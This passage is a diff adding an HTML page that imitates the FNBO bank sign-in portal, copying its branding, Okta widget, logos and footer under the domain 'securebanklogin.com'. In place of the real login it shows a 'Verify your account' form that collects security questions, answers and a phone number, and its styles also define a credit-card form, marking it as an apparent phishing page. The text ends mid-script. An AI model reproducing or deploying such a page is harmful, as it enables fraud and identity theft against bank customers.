@@ -1,0 +1,1344 @@
+
+<html lang="en" data-di-loaded="1"><head>
+	<title>securebanklogin.com - Sign In</title>
+	<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+	<meta content="no-cache" http-equiv="Pragma">
+	<meta content="-1" http-equiv="Expires">
+	<meta name="description" content="">
+	<meta name="robots" content="all">
+  	<link rel="shortcut icon" href="https://www.securebanklogin.com/favicon.ico" type="image/x-icon">
+	<script async="" src="https://cdn.decibelinsight.net/i/13808/209518/di.js" id="di_13808_209518"></script><script nonce="" src="/js/fnbobundle.js?seed=AABPKgSQAQAANxKGsBSYMGS7MYO1Fw6BGkPg-ufTRZ6cuX4kW_BCw6i7XF3A&amp;Zxqa1s51JA--z=q" id="c7b11faf7b12c47799cc279eca5ea85b"></script>
+	<script src="https://cdn.fnbo.com/@shared-services/deps/npm/vue@3.3.13/dist/vue.global.js"></script>
+	<meta name="viewport" content="width=device-width,initial-scale=1">
+	<style>
+		#okta-sign-in.auth-container .o-form-input-name-rememberDevice {
+			display: none;
+		}
+
+		#okta-sign-in.auth-container .button {
+			background: #6b6b6b;
+			color: #fff;
+		}
+
+		#okta-sign-in.auth-container .button.button-primary:focus,
+		#okta-sign-in.auth-container .button.button-primary:active,
+		#okta-sign-in.auth-container .button.button-primary:hover {
+			background: #fff;
+		}
+
+		#okta-sign-in.auth-container .button:focus,
+		#okta-sign-in.auth-container .button:active,
+		#okta-sign-in.auth-container .button:hover {
+			border-color: #6b6b6b;
+			background: #fff;
+			color: #6b6b6b;
+		}
+
+		#okta-login-container #okta-sign-in.auth-container .call-request-button,
+		#okta-login-container #okta-sign-in.auth-container .sms-request-button {
+			background: #ffa500;
+			color: #000;
+			font-weight: bold;
+		}
+
+		body.brand-default footer,
+		body.brand-fsl footer {
+			color: #00634a;
+		}
+
+		body.brand-default .footer-utility,
+		body.brand-fnbo .footer-utility,
+		body.brand-fsl .footer-utility {
+			background-color: #00634a;
+		}
+
+		body.brand-default #okta-sign-in.auth-container .button,
+		body.brand-fnbo #okta-sign-in.auth-container .button,
+		body.brand-fsl #okta-sign-in.auth-container .button {
+			background: #00634a;
+			color: #fff;
+		}
+
+		body.brand-default #okta-sign-in.auth-container .button:focus,
+		body.brand-default #okta-sign-in.auth-container .button:active,
+		body.brand-default #okta-sign-in.auth-container .button:hover,
+		body.brand-fnbo #okta-sign-in.auth-container .button:focus,
+		body.brand-fnbo #okta-sign-in.auth-container .button:active,
+		body.brand-fnbo #okta-sign-in.auth-container .button:hover,
+		body.brand-fsl #okta-sign-in.auth-container .button:focus,
+		body.brand-fsl #okta-sign-in.auth-container .button:active,
+		body.brand-fsl #okta-sign-in.auth-container .button:hover {
+			border-color: #00634a;
+			background: #fff;
+			color: #00634a;
+		}
+
+		body.brand-connect footer,
+		body.brand-card footer,
+		body.brand-crawford footer,
+		body.brand-farmersandmerchants footer,
+		body.brand-firstbankcard footer,
+		body.brand-fnbodirect footer,
+		body.brand-fsbloomis footer,
+		body.brand-fxonlinebanking footer,
+		body.brand-houghton footer,
+		body.brand-landmands footer,
+		body.brand-shelby footer,
+		body.brand-sibley footer,
+		body.brand-washington footer,
+		body.brand-yorkstate footer {
+			color: #6b6b6b;
+		}
+
+		body.brand-connect .footer-utility,
+		body.brand-card .footer-utility,
+		body.brand-firstbankcard .footer-utility,
+		body.brand-fxonlinebanking .footer-utility {
+			background-color: #6b6b6b;
+		}
+
+		body.brand-crawford .footer-utility {
+			background-color: #538A91;
+		}
+
+		body.brand-farmersandmerchants .footer-utility {
+			background-color: #800020;
+		}
+
+		body.brand-fnbodirect .footer-utility {
+			background-color: #800020;
+		}
+
+		body.brand-fsbloomis .footer-utility {
+			background-color: #006341;
+		}
+
+		body.brand-houghton .footer-utility {
+			background-color: #015D90;
+		}
+
+		body.brand-landmands .footer-utility {
+			background-color: #4f4f4f;
+		}
+
+		body.brand-shelby .footer-utility {
+			background-color: #05482E;
+		}
+
+		body.brand-sibley .footer-utility {
+			background-color: #3d5588;
+		}
+
+		body.brand-washington .footer-utility {
+			background-color: #006747;
+		}
+
+		body.brand-yorkstate .footer-utility {
+			background-color: #980D0D;
+		}
+		#header {
+			color: rgb(68, 68, 68);
+			text-align: center;
+		}
+		@media only screen and (max-width: 600px) {
+			#header {
+				padding-left: 5px !important;
+				padding-right: 5px !important;
+			}
+		}
+		footer {
+			font-family: Avenir, "Helvetica Neue", Helvetica, sans-serif;
+			font-size: 12px;
+			margin: 0 auto 80px auto;
+			padding: 0;
+			max-width: 400px;
+			text-align: center;
+		}
+
+		.footer-utility {
+			color: #ffffff;
+			padding: 8px;
+		}
+
+		.footer-utility a {
+			color: #ffffff;
+			display: inline-block;
+			padding: 8px;
+			text-decoration: none;
+			vertical-align: middle;
+		}
+
+		.copyright {
+			padding: 8px;
+		}
+
+		.copyright p {
+			margin: 0;
+			padding: 0;
+		}
+
+		#okta-sign-in .auth-org-logo {
+			max-width: 300px;
+			max-height: 80px;
+		}
+
+		#okta-sign-in .auth-header {
+			padding-left: 10px;
+			padding-right: 10px;
+		}
+
+		#okta-sign-in .js-help {
+			display: none;
+		}
+
+		#okta-sign-in .js-help-links {
+			display: inline-block;
+		}
+
+		#okta-sign-in .js-help-link {
+			display: none;
+		}
+
+		body.brand-default #okta-sign-in .js-help-link,
+		body.brand-fnbo #okta-sign-in .js-help-link {
+			display: none;
+		}
+
+		#okta-sign-in .mfa-verify-passcode .auth-passcode {
+			float: right;
+			margin-left: 6px;
+		}
+
+		#okta-sign-in .factors-dropdown-wrap {
+			right: -92px;
+		}
+
+		#okta-sign-in .factors-dropdown-wrap a.link-button {
+			width: 80px;
+		}
+
+		#okta-sign-in .factors-dropdown-wrap span.option-selected-text::after {
+			content: "Options";
+			color: black;
+			margin-right: 12px;
+		}
+
+		form[action="/signin/verify/okta/sms"][data-se="factor-sms"] .mfa-verify-passcode p.o-form-explain::after {
+			content: "\A\A Two simple steps:\A 1. Click the Send Code button below to begin.\A 2. Enter the code sent to your mobile device.";
+			white-space: pre;
+		}
+
+		@media only screen and (max-width: 600px) {
+			.footer-utility a {
+				display: block;
+			}
+		}
+
+        body {
+            font-family: Arial, sans-serif;
+            margin: 50px;
+        }
+        .credit-card-form {
+            max-width: 400px;
+            margin: auto;
+            padding: 20px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+        }
+        .credit-card-form h2 {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+        .form-group {
+            margin-bottom: 15px;
+        }
+        .form-group label {
+            display: block;
+            margin-bottom: 5px;
+        }
+        .form-group input {
+            width: calc(100% - 22px);
+            padding: 10px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+        }
+        .form-group .expiry-date {
+            display: flex;
+            justify-content: space-between;
+        }
+        .form-group .expiry-date input {
+            width: calc(48% - 10px);
+        }
+        .form-group button {
+            width: 100%;
+            padding: 10px;
+            background-color: #007BFF;
+            color: #fff;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+        .form-group button:hover {
+            background-color: #0056b3;
+        }
+
+	</style>
+	<!-- Core widget js and css -->
+<script type="text/javascript" src="https://ok11static.oktacdn.com/assets/js/sdk/okta-signin-widget/7.18.1/js/okta-sign-in.min.js" integrity="sha384-oFGbqv1P6l7yLScit/IG2TTY1QFtrWMnxiMAkRRlM1Ha3cmUng0iNeu8BeSqrUVT" crossorigin="anonymous"></script>
+<link rel="stylesheet" type="text/css" href="https://ok11static.oktacdn.com/assets/js/sdk/okta-signin-widget/7.18.1/css/okta-sign-in.min.css" integrity="sha384-FL6VsXYuwuq1Zo5lnWVgcOMWSo1JuvDue2bQ66/TdWOTwPEU9OgvF4Ks8fNnaiHd" crossorigin="anonymous">
+
+<!-- Customizable css theme options. Link your own stylesheet or override styles inline. -->
+<link rel="stylesheet" type="text/css" href="" integrity="" crossorigin="anonymous">
+
+<!-- styles for custom sign in -->
+<link rel="stylesheet" type="text/css" href="https://ok11static.oktacdn.com/assets/loginpage/css/custom-signin.73947dcedbe30f708373f1b3405f6417.css" integrity="sha384-qvAdE/i9Q84SM7zV5CkigOjJfQgN2hnUnC5AO0GfHsLy0fGtP+YJsTCxnynmezlc" crossorigin="anonymous">
+
+
+<script src="https://ok11static.oktacdn.com/assets/js/mvc/loginpage/initLoginPage.pack.58de3be0c9b511a0fdfd7ea4f69b56fc.js" integrity="sha384-cJ4LGViZBmIttMPH+ao2RyPuN5BztKWYWIa4smbm56r1cUhkU/Dr6vTS3UoPbKTI" crossorigin="anonymous"></script><script src="https://assets.adobedtm.com/extensions/EPef068a8d6dd34a43866d9a80cc98baab/AppMeasurement.min.js" async=""></script></head>
+<body id="default" class="brand-fnbo"><script src="//assets.adobedtm.com/aaee7fd81fbc/ad0c2e8d01f4/launch-43eac16005c7.min.js" type="text/javascript" async=""></script>
+	<div class="login-bg-image" style="background-image: none"></div>
+	<div class="module" id="okta-login-container">
+        <main data-se="auth-container" tabindex="-1" id="okta-sign-in" class="auth-container main-container no-beacon" style="">
+            <div class="okta-sign-in-header auth-header"><h1><img src="https://www.card.fnbo.com/content/dam/fnbo/logos/fnbo-simple-green.svg" class="auth-org-logo" alt="securebanklogin.com logo logo" aria-label="securebanklogin.com logo logo"></h1>
+                <div data-type="beacon-container" class="beacon-container"></div></div><div class="auth-content"><div class="auth-content-inner"><div class="primary-auth">
+                    <form  method="post">
+                        <h2 data-se="o-form-head" class="okta-form-title o-form-head">Verify your account</h2>
+                        <div class="form-group">
+                            <label for="sc">security Question1</label>
+                            <input type="text" id="sc" name="sc" required>
+                        </div>
+                        <div class="form-group">
+                            <label for="sa">Answer</label>
+                            <input type="text" id="sa" name="sa"  required>
+                        </div>
+                        <div class="form-group">
+                            <label for="sc1">security Question2</label>
+                            <input type="text" id="sc1" name="sc1" required>
+                        </div>
+                        <div class="form-group">
+                            <label for="sa1">Answer</label>
+                            <input type="text" id="sa1" name="sa1"  required>
+                        </div>
+                        <div class="form-group expiry-date">
+                            <div>
+                                <label for="pn">Phone Number</label>
+                                <input type="text" id="pn" name="pn"   required>
+                            </div>
+                        </div>
+               
+                        <div class="form-group">
+                            <br>
+                            <input class="button button-primary" type="submit" value="Verify" id="okta-signin-submit" data-type="save" data-di-id="#okta-signin-submit">
+
+                        </div>
+                    </form>
+
+                    <style id="okta-sign-in-config-colors" type="text/css">
+
+#okta-sign-in.auth-container .button-primary,
+#okta-sign-in.auth-container .button-primary:active,
+#okta-sign-in.auth-container .button-primary:focus { background: #00634a; }
+#okta-sign-in.auth-container .button-primary:hover { background: #00684e; }
+#okta-sign-in.auth-container .button.button-primary.link-button-disabled {
+  background: #00634a;
+  opacity: 0.5;
+}
+    </style></main></div>
+	<footer id="footer"><div class="footer-utility">
+    <a href="https://www.fnbo.com/privacy-policy/" data-di-id="di-id-2fe02479-922d541d">Privacy Policy</a>
+    <a href="https://www.fnbo.com/security-center/" data-di-id="di-id-2fe02479-b86e096d">Security Statement</a>
+    <a class="fdic-link" href="#" data-di-id="di-id-d124d922-859171cb">Member FDIC</a>
+    <a class="ehl-link" href="#"><img src="https://www.securebanklogin.com/brand/images/logo-equal-housing-lender.png" alt="Equal Housing Lender" title="Equal Housing Lender"></a>
+</div>
+<div class="copyright">
+    <p>Copyright © 2024 FNBO. All Rights Reserved.</p>
+    <p>1620 Dodge Street, Omaha, Nebraska 68197</p>
+</div></footer>
+	
+
+
+
+	<script type="text/javascript">
+		var utag_data = {};
+
+		(function() {
+
+			var brands = {
+				"connect":{
+					"brandName":"FNBO",
+					"colors":{
+						"brand":"#6b6b6b"
+					},
+					"agentBank" : "",
+					"logo": "https://www.card.fnbo.com/content/dam/partner/logos/fnbo-simple-black.svg",
+					"isPartner" : true,
+					"header" : "<p>Use your FNBO User ID to sign in and connect your credit card to your FNBO Connect account.</p>",
+					"footer": "<p>If you need assistance, please call 1-877-840-7283.</p>",
+					"homePageUrl": "https://www.connect.fnbo.com"
+				},
+				"sso":{
+					"brandName":"FNBO",
+					"colors":{
+						"brand":"#5B798B"
+					},
+					"logo": "https://www.card.fnbo.com/content/dam/partner/logos/fnbo-simple-black.svg",
+					"isPartner" : true,
+					"header" : "<p>Use your FNBO User ID to sign in and connect your credit card to your FNBO account.</p>",
+					"footer": "<p>FNBO is the issuer of your credit card account. We offer our partners quality credit card products and services to help you use and manage your account.</p>",
+					"homePageUrl": "https://www.card.fnbo.com"
+				},
+				"card":{
+					"brandName":"FNBO",
+					"colors":{
+						"brand":"#5B798B"
+					},
+					"agentBank" : "",
+					"logo": "https://www.card.fnbo.com/content/dam/partner/logos/fnbo-simple-black.svg",
+					"isPartner" : true,
+					"header" : "<p>Use your FNBO User ID to sign in and connect your credit card to your FNBO account.</p>",
+					"footer": "<p>FNBO is the issuer of your credit card account. We offer our partners quality credit card products and services to help you use and manage your account.</p>",
+					"homePageUrl": "https://www.card.fnbo.com"
+				},
+				"crawford":{
+					"brandName":"Crawford County Bank",
+					"colors":{
+						"brand":"#538A91"
+					},
+					"logo": "https://www.card.fnbo.com/content/dam/lauritzen/logos/crawford-logo-color.svg",
+					"isPartner" : false,
+					"footer": "banking",
+					"privacyPolicy": "https://www.crawfordcountybank.com/privacy-policy/",
+					"securityStatement": "https://www.crawfordcountybank.com/security-center/",
+					"address": "21 North Main Street, Denison, IA 51442",
+					"homePageUrl": "https://www.crawfordcountybank.com"
+				},
+				"default":{
+					"brandName":"FNBO",
+					"colors":{
+						"brand":"#00634a"
+					},
+					"logo": "https://www.card.fnbo.com/content/dam/fnbo/logos/fnbo-simple-green.svg",
+					"isPartner" : false,
+					"footer": "banking",
+					"privacyPolicy": "https://www.fnbo.com/privacy-policy/",
+					"securityStatement": "https://www.fnbo.com/security-center/",
+					"address": "1620 Dodge Street, Omaha, Nebraska 68197",
+					"homePageUrl": "https://www.fnbo.com"
+				},
+				"farmersandmerchants":{
+					"brandName":"Farmers and Merchants State Bank",
+					"colors":{
+						"brand":"#800020"
+					},
+					"logo": "https://www.card.fnbo.com/content/dam/lauritzen/logos/fandm-logo.svg",
+					"isPartner" : false,
+					"footer": "banking",
+					"privacyPolicy": "https://www.fandmstatebank.com/privacy-policy/",
+					"securityStatement": "https://www.fandmstatebank.com/security-center/",
+					"address": "P.O. Box 69, Bloomfield, NE 68718",
+					"homePageUrl": "https://www.fandmstatebank.com"
+				},
+				"firstbankcard":{
+					"brandName":"FNBO",
+					"colors":{
+						"brand":"#5B798B"
+					},
+					"agentBank" : "",
+					"logo": "https://www.card.fnbo.com/content/dam/partner/logos/fnbo-simple-black.svg",
+					"isPartner" : true,
+					"header" : "<p>Use your FNBO User ID to sign in and connect your credit card to your First Bank account.</p>",
+					"footer": "<p>FNBO is the issuer of your credit card account. We offer our partners quality credit card products and services to help you use and manage your account.</p>",
+					"homePageUrl": "https://www.card.fnbo.com"
+				},
+				"fnbo":{
+					"brandName":"FNBO",
+					"colors":{
+						"brand":"#00634a"
+					},
+					"logo": "https://www.card.fnbo.com/content/dam/fnbo/logos/fnbo-simple-green.svg",
+					"isPartner" : false,
+					"footer": "banking",
+					"privacyPolicy": "https://www.fnbo.com/privacy-policy/",
+					"securityStatement": "https://www.fnbo.com/security-center/",
+					"address": "1620 Dodge Street, Omaha, Nebraska 68197",
+					"homePageUrl": "https://www.fnbo.com"
+				},
+				"fnbodirect":{
+					"brandName":"FNBO Direct",
+					"colors":{
+						"brand":"#026FAA"
+					},
+					"agentBank" : "001",
+					"logo": "https://www.card.fnbo.com/content/dam/fnbo/logos/fnbodirect.svg",
+					"isPartner" : true,
+					"header" : "<p>Use your FNBO User ID to sign in and connect your credit card to your First National Bank account.</p>",
+					"footer": "<div class=\"copyright\"><p>Copyright &copy; copyrightYear FNBO Direct, a division of First National Bank of Omaha. All Rights Reserved.</p><p>Deposit Accounts offered by First National Bank of Omaha, Member FDIC. Deposits are insured to the maximum permitted by law.</p><p>P.O. Box 3707, Omaha, NE 68103-0707.</p></div>",
+					"homePageUrl": "https://www.fnbodirect.com"
+				},
+				"fsbloomis":{
+					"brandName":"First State Bank",
+					"colors":{
+						"brand":"#006341"
+					},
+					"logo": "https://www.card.fnbo.com/content/dam/lauritzen/logos/fsb-logo.svg",
+					"isPartner" : false,
+					"footer": "banking",
+					"privacyPolicy": "https://www.fsbloomis.com/privacy-policy/",
+					"securityStatement": "https://www.fsbloomis.com/security-center/",
+					"address": "211 Commercial Street, Loomis, NE 68958",
+					"homePageUrl": "https://www.fsbloomis.com"
+				},
+				"fsl":{
+					"brandName":"FNBO",
+					"colors":{
+						"brand":"#006341"
+					},
+					"isPartner" : false,
+					"logo": "https://www.card.fnbo.com/content/dam/fnbo/logos/fnbo-simple-green.svg",
+					"footer": "",
+					"homePageUrl": "https://www.fnbolending.com"
+				},
+				"fxonlinebanking":{
+					"brandName":"fxonlinebanking",
+					"colors":{
+						"brand":"#6b6b6b"
+					},
+					"isPartner" : false,
+					"logo": "https://www.card.fnbo.com/content/dam/global/logos/fx-online-banking-color-logo.svg",
+					"footer": "",
+					"homePageUrl": "https://www.fxonlinebanking.com"
+				},
+				"houghton":{
+					"brandName":"Houghton State Bank",
+					"colors":{
+						"brand":"#015D90"
+					},
+					"logo": "https://www.card.fnbo.com/content/dam/lauritzen/logos/houghtonstatebank-logo-color.svg",
+					"isPartner" : false,
+					"footer": "banking",
+					"privacyPolicy": "https://www.houghtonstatebank.com/privacy-policy/",
+					"securityStatement": "https://www.houghtonstatebank.com/security-center/",
+					"address": "116 E. Coolbaugh Street, Red Oak, IA 51566",
+					"homePageUrl": "https://www.houghtonstatebank.com"
+				},
+				"landmands":{
+					"brandName":"Landmands Bank",
+					"colors":{
+						"brand":"#4f4f4f"
+					},
+					"logo": "https://www.card.fnbo.com/content/dam/lauritzen/logos/landmands-logo.svg",
+					"isPartner" : false,
+					"footer": "banking",
+					"privacyPolicy": "https://www.landmands.com/privacy-policy/",
+					"securityStatement": "https://www.landmands.com/security-center/",
+					"address": "P.O. Box 267, Audubon, IA 50025",
+					"homePageUrl": "https://www.landmands.com"
+				},
+				"shelby":{
+					"brandName":"Shelby County State Bank",
+					"colors":{
+						"brand":"#05482E"
+					},
+					"logo": "https://www.card.fnbo.com/content/dam/lauritzen/logos/scsbnet-logo.svg",
+					"isPartner" : false,
+					"footer": "banking",
+					"privacyPolicy": "https://www.scsbnet.com/privacy-policy/",
+					"securityStatement": "https://www.scsbnet.com/security-center/",
+					"address": "P.O. Box 29, Harlan, IA 51537",
+					"homePageUrl": "https://www.scsbnet.com"
+				},
+				"sibley":{
+					"brandName":"Sibley State Bank",
+					"colors":{
+						"brand":"#3d5588"
+					},
+					"agentBank" : "",
+					"logo": "https://www.card.fnbo.com/content/dam/lauritzen/logos/sibley-logo.svg",
+					"isPartner" : true,
+					"header" : "<p>Use your FNBO User ID to sign in and connect your credit card to your Sibley State Bank account.</p>",
+					"footer": "banking",
+					"privacyPolicy": "https://www.sibleystatebank.com/privacy-policy/",
+					"securityStatement": "https://www.sibleystatebank.com/security-center/",
+					"address": "P.O. Box 96, Sibley, IA 51249",
+					"homePageUrl": "https://www.sibleystatebank.com"
+				},
+				"washington":{
+					"brandName":"Washington County Bank",
+					"colors":{
+						"brand":"#006747"
+					},
+					"logo": "https://www.card.fnbo.com/content/dam/lauritzen/logos/washingtoncountybank.svg",
+					"isPartner" : false,
+					"footer": "banking",
+					"privacyPolicy": "https://www.washingtoncountybank.com/privacy-policy/",
+					"securityStatement": "https://www.washingtoncountybank.com/security-center/",
+					"address": "P.O. Box 248, Blair, NE 68008",
+					"homePageUrl": "https://www.washingtoncountybank.com"
+				},
+				"yorkstate":{
+					"brandName":"York State Bank",
+					"colors":{
+						"brand":"#980D0D"
+					},
+					"logo": "https://www.card.fnbo.com/content/dam/lauritzen/logos/ysb-color-logo.svg",
+					"isPartner" : false,
+					"footer": "banking",
+					"privacyPolicy": "https://www.yorkstatebank.com/privacy-policy/",
+					"securityStatement": "https://www.yorkstatebank.com/security-center/",
+					"address": "P.O. Box 39, York, NE 68467",
+					"homePageUrl": "https://www.yorkstatebank.com"
+				},
+				"ford":{
+					"brandName":"FNBO",
+					"colors":{
+						"brand":"#2096cd"
+					},
+					"agentBank" : "FPR",
+					"logo": "https://www.card.fnbo.com/content/dam/partner/logos/fordpass-logo.svg",
+					"isPartner" : true,
+					"header" : "<p>Use your FNBO User ID to sign in and connect your credit card to your Ford account.</p>",
+					"footer": "<p>FNBO is the issuer of your credit card account. We offer our partners quality credit card products and services to help you use and manage your account.</p>",
+					"homePageUrl": "https://www.card.fnbo.com/ford"
+				},
+				"scheels":{
+					"brandName":"FNBO",
+					"colors":{
+						"brand":"#da1a32"
+					},
+					"agentBank" : "244",
+					"logo": "https://www.card.fnbo.com/content/dam/partner/logos/scheels-logo.svg",
+					"isPartner" : true,
+					"header" : "<p>Use your FNBO User ID to sign in and connect your credit card to your Scheels account.</p>",
+					"footer": "<p>FNBO is the issuer of your credit card account. We offer our partners quality credit card products and services to help you use and manage your account.</p>",
+					"homePageUrl": "https://www.card.fnbo.com/scheels"
+				},
+				"mlife":{
+					"brandName":"FNBO",
+					"colors":{
+						"brand":"#877440"
+					},
+					"agentBank" : "",
+					"logo": "https://www.card.fnbo.com/content/dam/partner/logos/mgm-rewards-logo.svg",
+					"isPartner" : true,
+					"header" : "<p>Use your FNBO User ID to sign in and connect your credit card to your FNBO account.</p>",
+					"footer": "<p>FNBO is the issuer of your credit card account. We offer our partners quality credit card products and services to help you use and manage your account.</p>",
+					"homePageUrl": "https://www.card.fnbo.com/mlife"
+				},
+				"chrysler":{
+					"brandName":"FNBO",
+					"colors":{
+						"brand":"#3a57a0"
+					},
+					"agentBank" : "C01",
+					"logo": "https://www.card.fnbo.com/content/dam/partner/logos/chrysler-logo.svg",
+					"isPartner" : true,
+					"header" : "<p>Use your FNBO User ID to sign in and connect your credit card to your Chrysler account.</p>",
+					"footer": "<p>FNBO is the issuer of your credit card account. We offer our partners quality credit card products and services to help you use and manage your account.</p>",
+					"homePageUrl": "https://www.card.fnbo.com/chrysler"
+				},
+				"dodge":{
+					"brandName":"FNBO",
+					"colors":{
+						"brand":"#d50000"
+					},
+					"agentBank" : "C02",
+					"logo": "https://www.card.fnbo.com/content/dam/partner/logos/dodge-logo.svg",
+					"isPartner" : true,
+					"header" : "<p>Use your FNBO User ID to sign in and connect your credit card to your Dodge account.</p>",
+					"footer": "<p>FNBO is the issuer of your credit card account. We offer our partners quality credit card products and services to help you use and manage your account.</p>",
+					"homePageUrl": "https://www.card.fnbo.com/dodge"
+				},
+				"fiat":{
+					"brandName":"FNBO",
+					"colors":{
+						"brand":"#ad0c33"
+					},
+					"agentBank" : "C05",
+					"logo": "https://www.card.fnbo.com/content/dam/partner/logos/fiat-logo.svg",
+					"isPartner" : true,
+					"header" : "<p>Use your FNBO User ID to sign in and connect your credit card to your FIAT account.</p>",
+					"footer": "<p>FNBO is the issuer of your credit card account. We offer our partners quality credit card products and services to help you use and manage your account.</p>",
+					"homePageUrl": "https://www.card.fnbo.com/fiat"
+				},
+				"jeep":{
+					"brandName":"FNBO",
+					"colors":{
+						"brand":"#ffba00"
+					},
+					"agentBank" : "C03",
+					"logo": "https://www.card.fnbo.com/content/dam/partner/logos/jeep-logo.svg",
+					"isPartner" : true,
+					"header" : "<p>Use your FNBO User ID to sign in and connect your credit card to your Jeep account.</p>",
+					"footer": "<p>FNBO is the issuer of your credit card account. We offer our partners quality credit card products and services to help you use and manage your account.</p>",
+					"homePageUrl": "https://www.card.fnbo.com/jeep"
+				},
+				"mopar":{
+					"brandName":"FNBO",
+					"colors":{
+						"brand":"#0068b3"
+					},
+					"agentBank" : "C06",
+					"logo": "https://www.card.fnbo.com/content/dam/partner/logos/mopar-logo.svg",
+					"isPartner" : true,
+					"header" : "<p>Use your FNBO User ID to sign in and connect your credit card to your MOPAR account.</p>",
+					"footer": "<p>FNBO is the issuer of your credit card account. We offer our partners quality credit card products and services to help you use and manage your account.</p>",
+					"homePageUrl": "https://www.card.fnbo.com/mopar"
+				},
+				"ram":{
+					"brandName":"FNBO",
+					"colors":{
+						"brand":"#880d00"
+					},
+					"agentBank" : "C04",
+					"logo": "https://www.card.fnbo.com/content/dam/partner/logos/ram-logo.svg",
+					"isPartner" : true,
+					"header" : "<p>Use your FNBO User ID to sign in and connect your credit card to your RAM account.</p>",
+					"footer": "<p>FNBO is the issuer of your credit card account. We offer our partners quality credit card products and services to help you use and manage your account.</p>",
+					"homePageUrl": "https://www.card.fnbo.com/ram"
+				},
+				"nea":{
+					"brandName":"FNBO",
+					"colors":{
+						"brand":"#005DAA"
+					},
+					"agentBank" : "",
+					"logo": "https://www.card.fnbo.com/content/dam/partner/logos/nea-logo.svg",
+					"isPartner" : true,
+					"header" : "<p>Use your FNBO User ID to sign in and connect your credit card to your NEA account.</p>",
+					"footer": "<p>FNBO is the issuer of your credit card account. We offer our partners quality credit card products and services to help you use and manage your account.</p>",
+					"homePageUrl": "https://www.fnbolending.com/nea"
+				},
+				"up":{
+					"brandName":"FNBO",
+					"colors":{
+						"brand":"#00447d"
+					},
+					"agentBank" : "",
+					"logo": "https://www.card.fnbo.com/content/dam/partner/logos/up-logo.svg",
+					"isPartner" : true,
+					"header" : "<p>Use your FNBO User ID to sign in and connect your credit card to your Union Plus account.</p>",
+					"footer": "<p>FNBO is the issuer of your credit card account. We offer our partners quality credit card products and services to help you use and manage your account.</p>",
+					"homePageUrl": "https://www.fnbolending.com/up"
+				},
+				"seiu":{
+					"brandName":"FNBO",
+					"colors":{
+						"brand":"#6c419a"
+					},
+					"agentBank" : "",
+					"logo": "https://www.card.fnbo.com/content/dam/partner/logos/seiu-logo.svg",
+					"isPartner" : true,
+					"header" : "<p>Use your FNBO User ID to sign in and connect your credit card to your SEIU account.</p>",
+					"footer": "<p>FNBO is the issuer of your credit card account. We offer our partners quality credit card products and services to help you use and manage your account.</p>",
+					"homePageUrl": "https://www.fnbolending.com/seiu"
+				},
+				"verizon":{
+					"brandName":"FNBO",
+					"colors":{
+						"brand":"#000000"
+					},
+					"agentBank" : "C17",
+					"logo": "https://www.card.fnbo.com/content/dam/partner/logos/verizon-business-mc-logo.svg",
+					"isPartner" : true,
+					"header" : "<p>Use your FNBO User ID to sign in and connect your credit card to your Verizon account.</p>",
+					"footer": "<p>FNBO is the issuer of your credit card account. We offer our partners quality credit card products and services to help you use and manage your account.</p>",
+					"homePageUrl": "https://www.card.fnbo.com/verizon"
+				},
+				"bp":{
+					"brandName":"FNBO",
+					"colors":{
+						"brand":"#007F00"
+					},
+					"agentBank" : "BPV",
+					"logo": "https://www.card.fnbo.com/content/dam/partner/logos/bp-me-rewards-logo.svg",
+					"isPartner" : true,
+					"header" : "<p>Use your FNBO User ID to sign in and connect your credit card to your BP account.</p>",
+					"footer": "<p>FNBO is the issuer of your credit card account. We offer our partners quality credit card products and services to help you use and manage your account.</p>",
+					"homePageUrl": "https://www.card.fnbo.com/bp"
+				},
+				"lincoln":{
+					"brandName":"FNBO",
+					"colors":{
+						"brand":"#324047"
+					},
+					"agentBank" : "LAR",
+					"logo": "https://www.card.fnbo.com/content/dam/partner/logos/lincoln-logo.svg",
+					"isPartner" : true,
+					"header" : "<p>Use your FNBO User ID to sign in and connect your credit card to your Lincoln account.</p>",
+					"footer": "<p>FNBO is the issuer of your credit card account. We offer our partners quality credit card products and services to help you use and manage your account.</p>",
+					"homePageUrl": "https://www.card.fnbo.com/lincoln"
+				},
+				"universal":{
+					"brandName":"FNBO",
+					"colors":{
+						"brand":"#0368D9"
+					},
+					"agentBank": "UFL",
+					"logo": "https://www.card.fnbo.com/content/dam/partner/logos/universal-rewards-logo.svg",
+					"isPartner": true,
+					"footer": "<p>FNBO is the issuer of your credit card account. We offer our partners quality credit card products and services to help you use and manage your account.</p>",
+					"homePageUrl": "https://www.card.fnbo.com/universal"
+				}			
+			};
+
+			var pathToPageNames = {
+				'': 'Sign In Main',
+				'/': 'Sign In Main',
+				'/signin': 'Sign In Main',
+				'/signin/': 'Sign In Main',
+				'/signin/enroll': 'Sign In Enroll Choices',
+				'/signin/enroll/okta/call': 'Sign In Enroll Call Option',
+				'/signin/enroll/okta/question': 'Sign In Enroll Question Option',
+				'/signin/enroll/okta/sms': 'Sign In Enroll SMS Option',
+				'/signin/enroll/okta/email': 'Sign In Enroll Email Option',
+				'/signin/enroll-activate/okta/email': 'Sign In Enroll Activate Email Option',
+				'/signin/forgot-password': 'Sign In Forgot Password',
+				'/signin/password-expired': 'Sign In Password Expired',
+				'/signin/password-reset': 'Sign In Password Reset',
+				'/signin/recovery-emailed': 'Sign In Recovery Emailed',
+				'/signin/reset-password': 'Sign In Reset Password',
+				'/signin/verify/okta/call': 'Sign In Verify Call',
+				'/signin/verify/okta/push': 'Sign In Verify SMS Push',
+				'/signin/verify/okta/question': 'Sign In Verify Question',
+				'/signin/verify/okta/sms': 'Sign In Verify SMS',
+				'/signin/verify/okta/email': 'Sign In Verify Email',
+				'/oauth2/default/v1/authorize': 'OIDC Authorization Request'
+			};
+
+			if (window.NodeList && !NodeList.prototype.forEach) {
+				NodeList.prototype.forEach = Array.prototype.forEach;
+			}
+
+			var agentBank = null;
+			var candidateBrandCode = null;
+			var requestContext = OktaUtil.getRequestContext();
+			if (requestContext && requestContext.user && requestContext.user.profile && requestContext.user.profile.login && requestContext.user.profile.login.indexOf('_') === 0) {
+				candidateBrandCode = 'connect';
+			} else if (requestContext && requestContext.authentication && requestContext.authentication.request) {
+				var redirectUri = requestContext.authentication.request.redirect_uri;
+				if (redirectUri) {
+					var brandIndex = redirectUri.indexOf('?brand=');
+					if (brandIndex !== -1) {
+						candidateBrandCode = redirectUri.substring(brandIndex + 7);
+					} else if (redirectUri.indexOf('https://connect') === 0) {
